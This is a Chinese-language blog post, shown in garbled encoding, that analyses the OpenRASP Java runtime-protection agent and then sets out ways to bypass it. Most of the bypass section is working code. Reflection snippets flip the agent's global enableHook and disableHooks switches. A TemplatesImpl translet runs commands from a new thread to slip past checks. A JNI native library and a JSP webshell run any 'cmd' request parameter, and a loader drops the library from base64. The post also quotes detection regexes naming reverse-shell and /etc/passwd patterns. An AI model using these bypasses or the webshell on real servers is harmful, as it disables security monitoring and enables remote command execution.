---
layout: post
title: openrasp
categories: [blog ]
tags: [Java,]
description: "å¯¹openraspçš„åˆ†æåŠç»•è¿‡"
image:
  feature: windows.jpg
  credit: JYcxk
  creditlink: azeril.com
---

## é¦–å…ˆé…ç½®openrasp+springbootçš„ç¯å¢ƒ

https://packages.baidu.com/app/openrasp/release/  windowsä¸‹è½½rasp-java.zip

https://rasp.baidu.com/doc/install/manual/spring-boot.html å‚è€ƒæ–‡æ¡£å»ºç«‹å•æœºæ¨¡å¼

springbootæ–‡ä»¶ä»æ­¤å¤„ä¸‹è½½ é“¾æ¥ï¼šhttps://pan.baidu.com/s/1SHB4LLLFl67SCKSxB1rQ0w æå–ç ï¼špo1e

```java
java -jar RaspInstall.jar -nodetect -install C:\Users\c'x'k\Desktop\raspæºç \springboot
java -javaagent:C:\Users\c'x'k\Desktop\raspæºç \springboot\rasp\rasp.jar -jar rasp-test-0.0.1-SNAPSHOT.jar
```

![image-20231119165516696](..\img\final\image-20231119165516696.png)

```java
C:\Users\c'x'k\Desktop\raspæºç \springboot>java -javaagent:C:\Users\c'x'k\Desktop\raspæºç \springboot\rasp\rasp.jar rasp-test-0.0.1-SNAPSHOT.jar
```

è¿è¡Œå³å¯

![image-20231119165551509](..\img\final\image-20231119165551509.png)

```java
 @GetMapping({"/hello4"})
    public String hello4(HttpServletRequest httpServletRequest) throws Exception {
        Object o = Class.forName("com.baidu.openrasp.HookHandler").newInstance();
        Field field = o.getClass().getDeclaredField("enableHook");
        Field modifiers = field.getClass().getDeclaredField("modifiers");
        modifiers.setAccessible(true);
        modifiers.setInt(field, field.getModifiers() & -17);
        field.set(o, new AtomicBoolean(false));
        Process process = Runtime.getRuntime().exec("ping baidu.com");
        process.waitFor();
        BufferedReader bufrIn = new BufferedReader(new InputStreamReader(process.getInputStream(), "UTF-8"));
        BufferedReader bufrError = new BufferedReader(new InputStreamReader(process.getErrorStream(), "UTF-8"));
        StringBuffer result = new StringBuffer();
        while (true) {
            String line = bufrIn.readLine();
            if (line != null) {
                result.append(line).append('\n');
            }
        }
        while (true) {
            String line2 = bufrError.readLine();
            if (line2 != null) {
                result.append(line2).append('\n');
            } else {
                System.out.println(result);
                return "hello4";
            }
        }
    }
}
```

![image-20231119195957111](..\img\final\image-20231119195957111.png)

æœç„¶æ˜¯æŠŠæ‰€æœ‰çš„ç®—æ³•éƒ½æ”¹æˆblockï¼Œhttp://127.0.0.1:8877/hello2è®¿é—®è¿™ä¸ªï¼Œå°±ä¼šè·³è½¬åˆ°(ä¹‹å‰æ²¡æ”¹çš„æ—¶å€™ç›´æ¥ä¼ å°±è¡Œäº†)

![image-20231119200956247](..\img\final\image-20231119200956247.png)

ä¸€å¼€å§‹æ²¡çœ‹æ‡‚ç°åœ¨æ‡‚äº†ï¼Œåœ¨Hellocontrollerä¸­ä¸€å…±æœ‰å››ä¸ªè·¯ç”±ï¼Œ/hello1 ã€/hello2ã€/hello3ã€/hello4ä¸€å…±æœ‰å››ä¸ªè¿™æ ·çš„è·¯ç”±

åªæœ‰ /hello1ã€/hello4å¯ä»¥å‘½ä»¤æ‰§è¡Œï¼Œå‰©ä½™ä¸¤ä¸ªè¢«openraspæ‹¦æˆªæ‰äº†ï¼ˆé‚£ä¹ˆå°±çœ‹çœ‹è¿™é‡Œä¿©æ˜¯å¦‚ä½•ç»•è¿‡çš„ï¼‰

## ä¸€ã€/hello1

å‘ç°è¿™é‡Œå¼€å¯äº†ä¸€ä¸ªæ–°çš„çº¿ç¨‹

![image-20231119210219136](..\img\final\image-20231119210219136.png)



![image-20231119221101455](..\img\final\image-20231119221101455.png)

### Checkerçš„åˆå§‹åŒ–ï¼ˆåˆ«é—®ä¸ºä»€ä¹ˆä»ä¸­é—´å¼€å§‹åˆ†æï¼Œé—®å°±æ˜¯ä¸Šé¢å•¥cã€jsv8ğŸ¤çœŸå¿ƒçœ‹ä¸æ‡‚ï¼‰

![image-20231120200158440](..\img\final\image-20231120200158440.png)

éå†typeç±»å‹ï¼Œå°†æ£€æµ‹ç±»å‹ä»¥åŠå¯¹åº”çš„æ£€æµ‹å‡½æ•°æ·»åŠ åˆ°`checkers`è¿™ä¸ª`EnumMap`å½“ä¸­

![image-20231120200338492](..\img\final\image-20231120200338492.png)

#### CustomClassTransformer

`å®ä¾‹åŒ–CustomClassTransformer(inst)`

![image-20231120200746900](..\img\final\image-20231120200746900.png)

å°†è‡ªèº«ä½œä¸ºç±»è½¬æ¢å™¨è¿›è¡Œæ·»åŠ 

![image-20231120200859041](..\img\final\image-20231120200859041.png)

å¹¶ä¸”ä¸Šé¢è°ƒç”¨äº†`retransform`

```java
public void retransform() {
        new LinkedList(); 
        Class[] loadedClasses = this.inst.getAllLoadedClasses();
        Class[] arr$ = loadedClasses;
        int len$ = loadedClasses.length;

        for(int i$ = 0; i$ < len$; ++i$) {
            Class clazz = arr$[i$];
            if (this.isClassMatched(clazz.getName().replace(".", "/")) && this.inst.isModifiableClass(clazz) && !clazz.getName().startsWith("java.lang.invoke.LambdaForm")) {//å¤§è‡´å°±æ˜¯å¡Lambdaçš„
                try {
                    this.inst.retransformClasses(new Class[]{clazz});
                } catch (Throwable var8) {
                    LogTool.error(ErrorType.HOOK_ERROR, "failed to retransform class " + clazz.getName() + ": " + var8.getMessage(), var8);
                }
            }
        }
    }
```

å› æ­¤ä¹‹åå½“ç±»åŠ è½½çš„æ—¶å€™ï¼Œä¼šè¿›å…¥æˆ‘ä»¬è‡ªå·±çš„ `Transformer` ä¸­ï¼Œæ‰§è¡Œ `transform`å‡½æ•°è¿›è¡Œæ‹¦æˆª

### Hook

æ„Ÿè§‰è¿™é‡Œæ˜¯é‡è¦çš„ç‚¹ï¼Œå¦‚ä½•è¿›è¡Œæ£€æµ‹é˜²å¾¡çš„

```java
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain domain, byte[] classfileBuffer) throws IllegalClassFormatException {
        if (loader != null) {
            DependencyFinder.addJarPath(domain);//è¿™é‡ŒjaråŒ…æ·»åŠ è¿›å¯åŠ¨ç±»åŠ è½½å™¨
        }

        if (loader != null && jspClassLoaderNames.contains(loader.getClass().getName())) {
            jspClassLoaderCache.put(className.replace("/", "."), new SoftReference(loader));
        }

        Iterator i$ = this.hooks.iterator();//è¿­ä»£ç±»

        while(i$.hasNext()) {
            AbstractClassHook hook = (AbstractClassHook)i$.next();
            if (hook.isClassMatched(className)) {//è¿™é‡Œå°±æ˜¯éå†ç±»çš„è¿™ä¸ªæ–¹æ³•è¿›è¡Œmatch
                CtClass ctClass = null;

                try {
                    ClassPool classPool = new ClassPool();
                    this.addLoader(classPool, loader);
                    ctClass = classPool.makeClass(new ByteArrayInputStream(classfileBuffer));
                    if (loader == null) {
                        hook.setLoadedByBootstrapLoader(true);
                    }

                    classfileBuffer = hook.transformClass(ctClass);//!!!
                    if (classfileBuffer != null) {
                        this.checkNecessaryHookType(hook.getType());
                    }
                } catch (IOException var13) {
                    var13.printStackTrace();
                } finally {
                    if (ctClass != null) {
                        ctClass.detach();
                    }

                }
            }
        }

        this.serverDetector.detectServer(className, loader, domain);
        return classfileBuffer;
    }
```

![image-20231120201907803](..\img\final\image-20231120201907803.png)

éå†çš„ç±»åœ¨å“ªé‡Œï¼Ÿåœ¨`open.baidu.oprasp.hook`æ–‡ä»¶å¤¹ä¸‹çš„ç±»

â€‹	è¿™é‡Œä¸¾ä¸€ä¸ªä¾‹å­ï¼ˆçœ‹å‘½ä»¤æ‰§è¡Œ  `com.baidu.oprasp.hook.system.ProcessBuilderHook`)è¿™ä¸ªç±»

ï¼ˆä¹‹å‰çœ‹åˆ°ä¸€ç¯‡æ–‡ç« è¯´openraspä½ç‰ˆæœ¬å‘½ä»¤æ‰§è¡Œçš„æ£€æµ‹æ–¹å¼æ˜¯ åˆ°startï¼Œå› æ­¤èƒ½ç”¨æœ€åº•å±‚ç»•è¿‡ï¼‰

`isClassMatchedçš„è§„åˆ™`

```java
//ç®€å•æ¦‚è¿°å°±æ˜¯ jdké«˜ç‰ˆæœ¬ä¸æ˜¯linuxå’Œwindwosåº•å±‚éƒ½åœ¨ ProcessImpläº†å˜›ï¼Œä¸‹é¢å°±æ˜¯ linux mac windowsçš„ä¸åŒç½¢äº†
//è¿”å›çš„éƒ½æ˜¯true
public boolean isClassMatched(String className) {
    if (ModuleLoader.isModularityJdk()) {
        return "java/lang/ProcessImpl".equals(className);
    } else if (!OSUtil.isLinux() && !OSUtil.isMacOS()) {
        return OSUtil.isWindows() ? "java/lang/ProcessImpl".equals(className) : false;
    } else {
        return "java/lang/UNIXProcess".equals(className);
    }
}
```

æˆ‘ä»¬å›åˆ°`com.baidu.openrasp.transformer.CustomClassTransformer#transform`å¯ä»¥çœ‹åˆ°æœ€ç»ˆè¿”å›çš„å­—èŠ‚ç æ˜¯å—`hook.transformClass`å¤„ç†çš„ï¼Œåœ¨è¿™é‡Œè¿˜æœ‰ä¸ªå°ç»†èŠ‚å°±æ˜¯å¦‚æœ`loader` ä¸º`null`ï¼Œåˆ™ä¼šè°ƒç”¨setloadedByBootstrapLoaderè®¾ç½®ä¸ºtrueï¼ˆè·å–ä¸åˆ°ç±»åŠ è½½å™¨ï¼Œè¯´æ˜æ˜¯ç”±å¯åŠ¨ç±»åŠ è½½å™¨åŠ è½½çš„ï¼‰

![image-20231120203456889](..\img\final\image-20231120203456889.png)

çœ‹transformClassæ–¹æ³•

```java
public byte[] transformClass(CtClass ctClass) {
        try {
            this.hookMethod(ctClass);
            return ctClass.toBytecode();
        } catch (Throwable var3) {
            if (Config.getConfig().isDebugEnabled()) {
                LOGGER.info("transform class " + ctClass.getName() + " failed", var3);
            }

            return null;
        }
    }
```

é‡Œé¢è°ƒç”¨äº†hookMethod æ–¹æ³•

```java
    protected void hookMethod(CtClass ctClass) throws IOException, CannotCompileException, NotFoundException {
        String src;
        if (ctClass.getName().contains("ProcessImpl")) {
            if (OSUtil.isWindows()) {
                    src = this.getInvokeStaticSrc(ProcessBuilderHook.class, "checkCommand", "$1,$2", new Class[]{String[].class, String.class});
                this.insertBefore(ctClass, "<init>", (String)null, src);
            } else if (ModuleLoader.isModularityJdk()) {
                src = this.getInvokeStaticSrc(ProcessBuilderHook.class, "checkCommand", "$1,$2,$4", new Class[]{byte[].class, byte[].class, byte[].class});
                this.insertBefore(ctClass, "<init>", (String)null, src);
            }
        } else if (ctClass.getName().contains("UNIXProcess")) {
            src = this.getInvokeStaticSrc(ProcessBuilderHook.class, "checkCommand", "$1,$2,$4", new Class[]{byte[].class, byte[].class, byte[].class});
            this.insertBefore(ctClass, "<init>", (String)null, src);
        }

    }
```

åœ¨`getInvokeStaticSrc`æ–¹æ³•ä¸­ï¼Œå¦‚æœè¿™ä¸ªå€¼ä¸ºtrue

```java
åœ¨è¿™é‡Œé€šè¿‡getInvokeStaticSrcè¿™ä¸ªæ–¹æ³•ç”Ÿæˆå…·ä½“æ’å…¥çš„ç±»ï¼Œåœ¨è¿™ä¸ªæ–¹æ³•å½“ä¸­å¯ä»¥çœ‹åˆ°ï¼Œå¯¹äºè¢«BootStrapåŠ è½½çš„ç±»ï¼Œå®ƒä¼šé€šè¿‡com.baidu.openrasp.ModuleLoader.moduleClassLoader.loadClasså»è°ƒç”¨æ£€æŸ¥å‘½ä»¤çš„checkCommandå‡½æ•°ï¼Œè¿™æ ·å°±é¿å…äº†ç”±äºåŒäº²å§”æ´¾æœºåˆ¶å¯¼è‡´çš„ClassNotFoundException
```

![image-20231120204325644](..\img\final\image-20231120204325644.png)

```java
public static void checkCommand(byte[] command, byte[] args, byte[] envBlock) {
        if ((Boolean)HookHandler.enableCmdHook.get()) {
            LinkedList<String> commands = new LinkedList();
          	//æ‰§è¡Œçš„å‘½ä»¤
            if (command != null && command.length > 0) {
                commands.add(new String(command, 0, command.length - 1));
            }
						
          	//æ‰§è¡Œçš„å‘½ä»¤çš„å‚æ•°
            int index;
            if (args != null && args.length > 0) {
                int position = 0;

                for(index = 0; index < args.length; ++index) {
                    if (args[index] == 0) {
                        commands.add(new String(Arrays.copyOfRange(args, position, index)));
                        position = index + 1;
                    }
                }
            }
						//æ¥è‡ªenvpå‚æ•°ï¼Œé€šå¸¸ä¸ºç©ºï¼Œé€šå¸¸æ˜¯è‡ªå·±è®¾ç½®çš„ç¯å¢ƒå˜é‡
            LinkedList<String> envList = new LinkedList();
            if (envBlock != null) {
                index = -1;

                for(int i = 0; i < envBlock.length; ++i) {
                    if (envBlock[i] == 0) {
                        String envItem = new String(envBlock, index + 1, i - index - 1);
                        if (envItem.length() > 0) {
                            envList.add(envItem);
                        }

                        index = i;
                    }
                }
            }

            checkCommand((List)commands, (List)envList);
        }

    }
```

ä¹‹ååœ¨è®²å‘½ä»¤å’Œç¯å¢ƒå˜é‡æ”¾åˆ°`commands`ä¸`envList`å½“ä¸­å¹¶æ‰§è¡Œ`checkCommand((List)commands, (List)envList);`ï¼Œè¿™é‡Œä¼šæŠŠæ‰§è¡Œçš„å‘½ä»¤ã€ç¯å¢ƒå˜é‡ã€ä»¥åŠå½“å‰è°ƒç”¨æ ˆå­˜æ”¾åˆ°paramsè¿™ä¸ªå˜é‡å½“ä¸­

![image-20231120204530219](..\img\final\image-20231120204530219.png)

![image-20231120204606475](..\img\final\image-20231120204606475.png)

ä¼šé€‰æ‹©åˆé€‚çš„checkerå»æ£€æŸ¥æˆ‘ä»¬æ‰§è¡Œçš„ä¸œè¥¿

```java
public static boolean check(Type type, CheckParameter parameter) {
  return ((Checker)checkers.get(type)).check(parameter);
}
```

ç»§ç»­çœç•¥ä¸€å †åºŸè¯ï¼Œæœ€ç»ˆä¼šè°ƒç”¨åˆ°`V8.check`,åº•å±‚äº†æˆ‘æ»šäº†

`å…¶å®å°±æ˜¯ç”¨jsã€Cåº•å±‚å†™äº†ä¸€ä¸ªcheckæœºåˆ¶ï¼Œjavaè´Ÿè´£hook`



## ç»•è¿‡æŠ€å·§

#### åŸºäºæ­£åˆ™çš„ç»•è¿‡

```java
command_common: {
  name:    'ç®—æ³•3 - è¯†åˆ«å¸¸ç”¨æ¸—é€å‘½ä»¤ï¼ˆæ¢é’ˆï¼‰',
    action:  'log',
      pattern: 'cat.{1,5}/etc/passwd|nc.{1,30}-e.{1,100}/bin/(?:ba)?sh|bash\\s-.{0,4}i.{1,20}/dev/tcp/|subprocess.call\\(.{0,6}/bin/(?:ba)?sh|fsockopen\\(.{1,50}/bin/(?:ba)?sh|perl.{1,80}socket.{1,120}open.{1,80}exec\\(.{1,5}/bin/(?:ba)?sh'
},
```

![image-20231120205653475](..\img\final\image-20231120205653475.png)

catèƒ½è¯»å¤šä¸ªæ–‡ä»¶

### é€šè¿‡ä¿®æ”¹æŸäº›å±æ€§

é€šå¸¸å¦‚æœå­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œæˆ‘ä»¬é€šå¸¸å¯ä»¥é€šè¿‡`TemplatesImpl`å»åŠ è½½ä»»æ„å­—èŠ‚ç ï¼Œåœ¨è¿™é‡Œå¦‚æœå¯¹äºåœ¨RASPæ‰§è¡Œæ£€æµ‹è¿‡ç¨‹å½“ä¸­å¦‚æœå­˜åœ¨æŸäº›å…³é”®é…ç½®æˆ‘ä»¬å¯ä»¥æ“æ§ï¼Œé‚£ä¹ˆå°±å¯ä»¥å¯¼è‡´ç»•è¿‡ï¼Œè€ŒOpenRaspé‡Œé¢å°±æœ‰ï¼Œæ¯”å¦‚åœ¨æ‰§è¡Œæ£€æµ‹å‰ä¸­é—´çš„è°ƒç”¨æµç¨‹æœ‰ä¸ª`com.baidu.openrasp.HookHandler#doCheckWithoutRequest`ï¼Œè¿™é‡Œé¢æåˆ°äº†å¦‚æœæœåŠ¡å™¨çš„cpuä½¿ç”¨ç‡è¶…è¿‡`90%`ï¼Œ`ç¦ç”¨å…¨éƒ¨hookç‚¹`

![image-20231120210219363](..\img\final\image-20231120210219363.png)

åˆæˆ–è€…æ»¡è¶³å½“äº‘æ§æ³¨å†ŒæˆåŠŸä¹‹å‰ï¼Œä¸è¿›å…¥ä»»ä½•hookç‚¹ï¼Œåæ­£è¿™äº›æˆ‘ä»¬ä¸éƒ½æ˜¯å¯ä»¥é€šè¿‡åå°„å»è®¾ç½®çš„ä¹ˆï¼Œè¿™é‡Œæˆ‘å°±éšä¾¿æ¥ä¸€ä¸ªï¼Œå°±ä»¥ç¬¬ä¸€ä¸ªä¸ºä¾‹å­å§ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åå°„è·å–è¿™ä¸ªå·²ç»å®ä¾‹åŒ–çš„å®ä¾‹ï¼Œåœ¨è¿™ä¸ªåŸºç¡€ä¸Šä¿®æ”¹`disableHooks`è¿™ä¸ªå±æ€§å³å¯

```java
try {
  Class<?> clz = Thread.currentThread().getContextClassLoader().loadClass("com.baidu.openrasp.config.Config");
  java.lang.reflect.Method getConfig = clz.getDeclaredMethod("getConfig");
  java.lang.reflect.Field disableHooks = clz.getDeclaredField("disableHooks");
  disableHooks.setAccessible(true);
  Object ins = getConfig.invoke(null);

  disableHooks.set(ins,true);
} catch (Exception e) {}
```

### åŸºäºçº¿ç¨‹ç»•è¿‡

raspä¼šåˆ¤æ–­è¯·æ±‚urlæ˜¯å¦ä¸ºç©ºæ¥åˆ¤æ–­æ˜¯å¦æ ¡éªŒï¼Œåˆ¤æ–­æ¡ä»¶éœ€è¦ä¸€ä¸ªç¯å¢ƒä¸Šä¸‹æ–‡(è¯·æ±‚çº¿ç¨‹)
æˆ‘ä»¬åªè¦å¼€å¯ä¸€ä¸ªæ–°çš„çº¿ç¨‹ï¼Œç”±å­çº¿ç¨‹å»è°ƒç”¨`Runtime.getRuntime.exec()`ï¼ŒRaspåˆ¤æ–­å¹¶ä¸æ˜¯ç”¨æˆ·è¯·æ±‚çº¿ç¨‹è§¦å‘äº†hookå‡½æ•°ï¼Œå°±ä¼šæ”¾è¡Œå‘½ä»¤æ‰§è¡Œæ“ä½œ

![image-20231120211757583](..\img\final\image-20231120211757583.png)

è¿™é‡Œä¼šæ‰§è¡Œï¼Œå› ä¸ºå®ç°äº†Runnableæ¥å£ï¼Œå°±ä¼šå¼¹è®¡ç®—å™¨	

```java
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;

import java.io.IOException;

public class BypassRasp extends AbstractTranslet implements Runnable{
    public BypassRasp(){
        new Thread(this).start();
    }

    @Override
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {
    }
    
    @Override
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {
    }

    @Override
    public void run() {
        try {
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c","gnome-calculator"} : new String[]{"cmd.exe", "/c", "calc"};
            Runtime.getRuntime().exec(cmds);
        }catch (IOException e){}
    }
}
```

### ä¿®æ”¹å…¨å±€å˜é‡enableHook

å‡å¦‚å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œæˆ‘ä»¬é€šå¸¸å¯ä»¥é€šè¿‡TemplatesImplå»åŠ è½½ä»»æ„å­—èŠ‚ç ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥ä½¿ç”¨åå°„çš„æ–¹å¼ï¼Œä¿®æ”¹raspçš„HookHandlerç±»çš„å˜é‡enableHookè®¾ç½®ä¸ºfalseï¼Œè€Œè¿™ä¸ªå˜é‡æ˜¯å…¨å±€çš„å¼€å…³ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€é‡æ–°å…³é—­è¿™ä¸ªå¼€å…³å°±å¯ä»¥ä½¿raspå¤±æ•ˆã€‚å®ç°å…¨å±€ç»•è¿‡

![image-20231120213135768](..\img\final\image-20231120213135768.png)

```java
Object o = Class.forName("com.baidu.openrasp.HookHandler").newInstance();
Field f = o.getClass().getDeclaredField("enableHook");
Field m = f.getClass().getDeclaredField("modifiers");
m.setAccessible(true);
m.setInt(f, f.getModifiers() & ~Modifier.FINAL);
f.set(o, new AtomicBoolean(false));
```



## JNIç»•è¿‡RASP

ä¸»è¦è®²è§£ä¸‹ Tomcatç¯å¢ƒä¸‹éƒ¨ç½²

Tomcatç¯å¢ƒä¸‹ï¼Œéœ€è¦ä»¥ä¸‹é™åˆ¶æ¡ä»¶ï¼š

- å›ºå®šåŒ…åæ ¼å¼ä¸º`org.apache.jsp`
- javaæ–‡ä»¶åç§°éœ€è¦å›ºå®šæ ¼å¼ï¼š `***_jsp` ï¼Œå¹¶ä¸”åé¢çš„jspæ–‡ä»¶åç§°éœ€è¦åŒå…¶ä¿æŒä¸€è‡´ã€‚ä¾‹å¦‚ `testtomcat_jsp.java`ï¼Œé‚£ä¹ˆæœ€ç»ˆjspçš„æ–‡ä»¶åç§°éœ€è¦å‘½åä¸º`testtomcat.jsp`

æˆ‘ä»¬é¦–å…ˆæ–°å»ºpackageä¸º`org.apache.jsp`ï¼Œç±»åä¸º`testtomcat_jsp`çš„.javaæ–‡ä»¶

```java
package org.apache.jsp;
public class testtomcat_jsp
{
  class JniClass
  {
       public native String exec( String string );
  }
}
```

ç„¶åjavacç¼–è¯‘æˆclassæ–‡ä»¶

```java
javac testtomcat_jsp.java
```

å‘½ä»¤æ‰§è¡Œåï¼Œç”Ÿæˆæ–‡ä»¶`testtomcat_jsp.class`å’Œ`testtomcat_jsp$JniClass.class`
ç„¶å

```java
javah -jni org.apache.jsp.testtomcat_jsp$JniClass
```

ç”Ÿæˆæ–‡ä»¶ `org_apache_jsp_testtomcat_jsp_JniClass.h`
ä¸ºäº†ç®€åŒ–åç»­C++å·¥ç¨‹çš„é…ç½®ï¼Œå°† `#include <jni.h>` ä¿®æ”¹ä¸º `#include "jni.h"`

æ¥ä¸‹æ¥ç¼–å†™å‘½ä»¤æ‰§è¡Œçš„Cè¯­è¨€ä»£ç JniClass.cï¼š

```java
#include "jni.h"
#include "org_apache_jsp_testtomcat_jsp_JniClass.h"
#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int execmd(const char *cmd, char *result)
{
    char buffer[1024*12];              //å®šä¹‰ç¼“å†²åŒº
    FILE *pipe = _popen(cmd, "r"); //æ‰“å¼€ç®¡é“ï¼Œå¹¶æ‰§è¡Œå‘½ä»¤
    if (!pipe)
        return 0; //è¿”å›0è¡¨ç¤ºè¿è¡Œå¤±è´¥

    while (!feof(pipe))
    {
        if (fgets(buffer, 128, pipe))
        { //å°†ç®¡é“è¾“å‡ºåˆ°resultä¸­
            strcat(result, buffer);
        }
    }
    _pclose(pipe); //å…³é—­ç®¡é“
    return 1;      //è¿”å›1è¡¨ç¤ºè¿è¡ŒæˆåŠŸ
}
JNIEXPORT jstring JNICALL Java_org_apache_jsp_testtomcat_1jsp_00024JniClass_exec(JNIEnv *env, jobject class_object, jstring jstr)
{

    const char *cstr = (*env)->GetStringUTFChars(env, jstr, NULL);
    char result[1024 * 12] = ""; //å®šä¹‰å­˜æ”¾ç»“æœçš„å­—ç¬¦ä¸²æ•°ç»„
    if (1 == execmd(cstr, result))
    {
       // printf(result);
    }

    char return_messge[100] = "";
    strcat(return_messge, result);
    jstring cmdresult = (*env)->NewStringUTF(env, return_messge);
    //system();

    return cmdresult;
}
```

ä½¿ç”¨gccå°†è¯¥cæºç ç¼–è¯‘ä¸º.dllæˆ–è€….so

```java
gcc -I "C:\Java\jdk1.8.0_231\include" -I "C:\Java\jdk1.8.0_231\include\win32" --shared JniClass.c -o 1.dll
```

æœ€ååœ¨webç›®å½•ä¸‹åˆ›å»ºtesttomcat.jspï¼Œå†…å®¹å¦‚ä¸‹ï¼š

```jsp
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!
    class JniClass {
        public native String exec(String string);
        public JniClass() {
            System.load("C:\\Users\\Desktop\\ä½œä¸š\\CTFå­¦ä¹ \\ä¸Šä¼ æ–‡ä»¶\\jsp\\jni\\1.dll");
        }
    }
%>
<%
    String cmd  = request.getParameter("cmd");
    if (cmd != null) {
        JniClass a = new JniClass();
        String res = a.exec(cmd);
        out.println(res);
    }
    else{
        response.sendError(404);
    }
%>
```

ç®€å•çœ‹äº†çœ‹

![image-20231120221050307](..\img\final\image-20231120221050307.png)

### ä½†å…¶å®ä»å®‰æ’æœˆèµ›æˆ‘ä»¬å°±èƒ½å‘ç°ä¸éœ€è¦ä¸Šä¼ dllè¿™äº›ï¼Œåªéœ€è¦ç”¨å†…å­˜é©¬æ„å»ºä¸€ä¸ªæ–°çš„è·¯ç”±ä¸€ä¸ªæ–°çš„æ–¹æ³•ç„¶åæŠŠdllåŠ è½½è¿›å»å³å¯

æœ¬åœ°è¯•ä¸€ä¸‹ï¼Œå°è¯•å†™ä¸€ä¸ªnativeæ–¹æ³•ï¼Œç„¶åæŠŠdllåŠ è½½è¿›å»

```java
1. å®šä¹‰ä¸€ä¸ªnativeä¿®é¥°çš„æ–¹æ³•
2. ä½¿ç”¨javahè¿›è¡Œç¼–è¯‘ 
3. ç¼–å†™å¯¹åº”çš„cè¯­è¨€ä»£ç 
4. ä½¿ç”¨gccç¼–è¯‘æˆdllæ–‡ä»¶
5. ç¼–å†™ä¸€ä¸ªJavaç±»ä½¿ç”¨System.loadLibraryæ–¹æ³•ï¼ŒåŠ è½½dllæ–‡ä»¶å¹¶ä¸”è°ƒç”¨
```

```java
gcc -I "C:\Program Files\Java\jdk1.8.0_65\include" - I "C:\Program Files\Java\jdk1.8.0_65\include\win32" -shared -o cmd.dll .\Command.c
 linuxç¼–è¯‘
g++ -fPIC -I"$JAVA_HOME/include" -I"$JAVA_HOME/include/linux" -shared -o libcmd.so com_anbai_sec_cmd_CommandExecution.cpp
```

éœ€è¦æ³¨æ„çš„æ˜¯åœ¨jdk10+ JDK10ç§»é™¤äº†`javah`,éœ€è¦æ”¹ä¸º`javac`åŠ `-h`å‚æ•°çš„æ–¹å¼ç”Ÿäº§å¤´æ–‡ä»¶

å¹¶ä¸”cæ–‡ä»¶æ˜¯æˆ‘ä»¬è‡ªå·±å†™çš„åå­—å’Œjavaä¸€è‡´

![image-20231121115010706](..\img\final\image-20231121115010706.png)

```java
#include "com_test_Command.h"
JNIEXPORT jint JNICALL Java_com_test_Command_sum
  (JNIEnv *env, jobject obj, jint num1, jint num2){
  return num1+num2;
  }
  void main(){}
```

#### è¸©å‘ç‚¹

```java
 System.loadLibrary("cmd");  //è¿™ä¸ªæ˜¯åªèƒ½è¯»å–åˆ° windowsç¯å¢ƒå˜é‡è®¾ç½®çš„è·¯å¾„ï¼Œtnndå¡äº†åŠå¤©
System.load("K:\\javafile\\javatomcatrasp\\src\\main\\java\\cmd.dll");  //loadå°±æ˜¯è‡ªå®šä¹‰äº†
```

![image-20231121115350788](..\img\final\image-20231121115350788.png)

#### å¯ä»¥å‘ç°è¿™æ ·ä¼šä¾èµ–æˆ‘ä»¬ä¸Šä¼ çš„dllè¿™ä¸ªæ–‡ä»¶ï¼Œèƒ½å¦ç›´æ¥åŠ è½½å­—èŠ‚ç çš„å½¢å¼å‘¢

é¦–å…ˆç”Ÿæˆå¯¹åº”çš„å­—èŠ‚ç ï¼Œä¸€æ¬¡ç”Ÿæˆnice

##### ç”Ÿæˆbase64å­—èŠ‚ç ä»£ç 

```java
public class JYcxk {
    public static void main(String[] args) throws IOException {
        Path path= Paths.get("K:\\javafile\\javatomcatrasp\\src\\main\\java\\cmd.dll");
        byte[] bytes= Files.readAllBytes(path);
        System.out.println(Base64.getEncoder().encodeToString(bytes));
    }
}
```

##### Command.java

```java
package com.test;

import java.io.IOException;
import java.io.RandomAccessFile;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.Vector;

public class Command {
    public native int sum(int num1,int num2);

    private static final String EVIL_JNI_BASE64 = "";//ğŸ‘´å°±ä¸æ”¾åœ¨è¿™é‡Œäº†,å¤ªé•¿äº†,è‡ªå·±ç”Ÿæˆ
        private static final String LIB_PATH = "libcmd.dll";
    static {
        try {


            byte[] jinBytes = Base64.getDecoder().decode(EVIL_JNI_BASE64);
            RandomAccessFile randomAccessFile = new RandomAccessFile(LIB_PATH, "rw");
            randomAccessFile.write(jinBytes);
            randomAccessFile.close();

            ClassLoader cmdLoader = Command.class.getClassLoader();
            System.out.println(cmdLoader);
            Class<?> classLoaderClazz = Class.forName("java.lang.ClassLoader");
            Class<?> nativeLibraryClazz = Class.forName("java.lang.ClassLoader$NativeLibrary");
            Method load = nativeLibraryClazz.getDeclaredMethod("load", String.class, boolean.class);

            load.setAccessible(true);
            Field field = classLoaderClazz.getDeclaredField("nativeLibraries");
            field.setAccessible(true);

            Vector<Object> libs = (Vector<Object>) field.get(cmdLoader);
            Constructor<?> nativeLibraryCons = nativeLibraryClazz.getDeclaredConstructor(Class.class, String.class, boolean.class);
            nativeLibraryCons.setAccessible(true);
            Object nativeLibraryObj = nativeLibraryCons.newInstance(Command.class, LIB_PATH, false);
            libs.addElement(nativeLibraryObj);
            field.set(cmdLoader, libs);
            load.invoke(nativeLibraryObj, LIB_PATH, false);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
```

![image-20231121123629099](..\img\final\image-20231121123629099.png)

